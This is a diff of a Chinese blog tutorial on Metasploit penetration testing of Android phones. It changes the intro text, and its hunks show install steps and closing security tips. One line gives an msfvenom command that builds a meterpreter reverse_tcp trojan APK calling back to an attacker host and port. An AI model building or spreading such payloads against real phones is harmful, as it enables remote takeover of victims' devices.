@@ -1,23 +1,18 @@
----
-title: 应用MSF域内渗透检测Android手机
-date: 2020-09-18 14:51:41
-tags:
-    - Android
----
-
 ### 安装msf
 
-是什么？
+是什么？Metasploit Framework
 
-全球最常用的渗透测试框架
+什么是Metasploit？
 
-验证漏洞开源的工具
+简单来说：全球最常用的渗透测试框架，ruby语言写的
+
+Metasploit是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的安全性进行评估，提供真正的安全风险情报。
+
+**验证漏洞开源的工具**
 
 官网：https://www.metasploit.com/
 
 github:https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers
-
-<!--more-->
 
 如果是mac环境，直接在命令行中输入
 
@@ -87,7 +82,6 @@ Would you like to use and setup a new database (recommended)? y
 
 ### 制作木马程序
 使用msfvenom工具来创建有效载荷APK文件（木马）
-
 
 ```
 $ msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.101 LPORT=5555 R > /Users/laibinzhi/temp/msf/mua.apk
@@ -502,10 +496,3 @@ done
 3. 手机不要root
 4. 手机app授权要谨慎
 5. 打包应用程序的时候安装包加固以免被不法分子反编译
-
-
-
-
-
-
-
